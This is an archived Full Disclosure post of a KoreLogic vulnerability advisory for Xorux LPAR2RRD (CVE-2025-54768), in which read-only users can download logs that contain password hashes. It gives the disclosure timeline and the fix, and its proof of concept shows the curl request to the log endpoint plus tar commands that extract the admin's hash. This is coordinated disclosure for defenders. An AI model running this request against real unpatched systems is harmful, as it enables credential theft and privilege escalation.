---
title: KL-001-2025-015: Xorux LPAR2RRD Read Only User Log Download Exposing Sensitive Information
url: https://seclists.org/fulldisclosure/2025/Jul/18
source: Full Disclosure
date: 2025-07-29
fetch_date: 2025-10-07T00:09:44.558209
---

# KL-001-2025-015: Xorux LPAR2RRD Read Only User Log Download Exposing Sensitive Information

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# KL-001-2025-015: Xorux LPAR2RRD Read Only User Log Download Exposing Sensitive Information

---

*From*: KoreLogic Disclosures via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Mon, 28 Jul 2025 18:41:35 -0500

---

```
KL-001-2025-015: Xorux LPAR2RRD Read Only User Log Download Exposing Sensitive Information

Title: Xorux LPAR2RRD Read Only User Log Download Exposing Sensitive Information
Advisory ID: KL-001-2025-015
Publication Date: 2025-07-28
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2025-015.txt

1. Vulnerability Details

     Affected Vendor: Xorux
     Affected Product: LPAR2RRD
     Affected Version: 8.04 and prior
     Platform: Rocky Linux 8.10
     CWE Classification: CWE-648: Incorrect Use of Privileged APIs
     CVE ID: CVE-2025-54768

2. Vulnerability Description

     An API endpoint that should be limited to web application
     administrators is hidden from, but accessible by, lower-level
     read only web application users. The endpoint can be used
     to download logs from the appliance configuration, exposing
     sensitive information.

3. Technical Description

     A read-only user can access a web application endpoint by which
     logs are downloaded. The logs are in tar.gz format, and can
     be extracted to reveal sensitive information that a read-only
     user should not be privileged to view. These files include
     password hashes for all users within the Xormon Original web
     application. An authenticated, read-only attacker could leverage
     this vulnerability to obtain and attempt to crack password
     hashes for more privileged users, including the admin user.

4. Mitigation and Remediation Recommendation

     Xorux released version 8.05, which includes a remediation
     for this vulnerability. See https://lpar2rrd.com/note800.php.

5. Credit

     This vulnerability was discovered by Jim Becher of KoreLogic,
     Inc.

6. Disclosure Timeline

     2025-07-17 : KoreLogic requests point-of-contact to securely
                  report several vulnerabilities to Xorux.
     2025-07-18 : Vendor provides support () xorux com as the
                  point-of-contact, noting that they do not use PGP.
     2025-07-21 : KoreLogic submits this vulnerability and four
                  additional discoveries to Xorux.
     2025-07-23 : Vendor acknowledges receipt, stating that the issue
                  has been remediated and a new version of the
                  affected product will be available 2025-07-25.
     2025-07-25 : Xorux publishes updated version of the affected
                  product.
     2025-07-28 : KoreLogic public disclosure.

7. Proof of Concept
```

         $ curl -kq --ignore-content-length -H "Authorization: Basic amJlY2hlcjpqYmVjaGVy"
'[https://172.31.255.207/lpar2rrd-cgi/vmwcfg.sh?cmd=logs'](https://172.31.255.207/lpar2rrd-cgi/vmwcfg.sh?cmd=logs&apos); -o logs-ignore.tar.gz

```
           % Total    % Received % Xferd  Average Speed   Time Time     Time  Current
                                      Dload  Upload   Total Spent    Left  Speed
         100  815k    0  815k    0     0   153k      0 --:--:-- 0:00:05 --:--:--     0

         $ ls -al logs-ignore.tar.gz
         -rw-rw-r-- 1 jbecher jbecher 835419 May 29 13:55 logs-ignore.tar.gz

         $ tar tvf logs-ignore.tar | egrep 'htusers.cfg|users.json'
         -rw-rw-rw- lpar2rrd/lpar2rrd      90 2025-04-02 16:19 etc/web_config/htusers.cfg
         -rw-rw-rw- lpar2rrd/lpar2rrd    1377 2025-04-02 16:19 etc/web_config/users.json
         ...

         $ tar xf logs-ignore.tar etc/web_config/htusers.cfg

         $ tar xf logs-ignore.tar etc/web_config/users.json

         $ cat etc/web_config/htusers.cfg
         admin:$apr1$CSoXefyw$wGe9K7Ld5ClOEozE4zC.T1
         jbecher:$apr1$gQ7dWXiz$g.m4JR/qNdJl.y0cg7NCb/

         $ more etc/web_config/users.json
         {
            "ACLimported" : false,
            "groups" : {
               "admins" : {
                  "ACL" : {
                     "vms" : {},
                     "cgroups" : [
                        "*"
                     ],
                     "pools" : {},
                     "solo" : {},
                     "lpars" : {}
                  },
                  "description" : "LPAR2RRD Administrators"
               },
               "ReadOnly" : {
                  "description" : "Member can see everything but nothing can change."
               }
            },
            "users" : {
               "admin" : {
                  "last_login" : "",
                  "config" : {
                     "db_width" : 120,
                     "timezone" : "",
                     "db_height" : 50,
                     "db_items" : [],
                     "locale" : "en-US",
                     "menu_width" : 150
                  },
                  "updated" : "2022-03-28T13:47:11Z",
                  "groups" : [
                     "admins"
                  ],
                  "email" : "",
                  "active" : 1,
                  "created" : "2022-03-28T13:47:11Z",
                  "name" : "LPAR2RRD Administrator",
                  "htpassword" : "$apr1$CSoXefyw$wGe9K7Ld5ClOEozE4zC.T1"
               },
               "jbecher" : {
                  "active" : true,
                  "config" : {
                     "timezone" : null
                  },
                  "email" : "jbecher () korelogic com",
                  "groups" : [
                     "ReadOnly"
                  ],
                  "htpassword" : "$apr1$gQ7dWXiz$g.m4JR/qNdJl.y0cg7NCb/",
                  "created" : "2025-04-02T20:18:59Z",
                  "name" : "Jim Becher"
               }
            }
         }

The contents of this advisory are copyright(c) 2025
KoreLogic, Inc. and are licensed under a Creative Commons
Attribution Share-Alike 4.0 (United States) License:
http://creativecommons.org/licenses/by-sa/4.0/

KoreLogic, Inc. is a founder-owned and operated company with a
proven track record of providing security services to entities
ranging from Fortune 500 to small and mid-sized companies. We
are a highly skilled team of senior security consultants doing
by-hand security assessments for the most important networks in
the U.S. and around the world. We are also developers of various
tools and resources aimed at helping the security community.
https://www.korelogic.com/about-korelogic.html

Our public vulnerability disclosure policy is available at:
https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
```

**Attachment:
[OpenPGP\_signature.asc](att-18/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

### Current thread:

* **KL-001-2025-015: Xorux LPAR2RRD Read Only User Lo...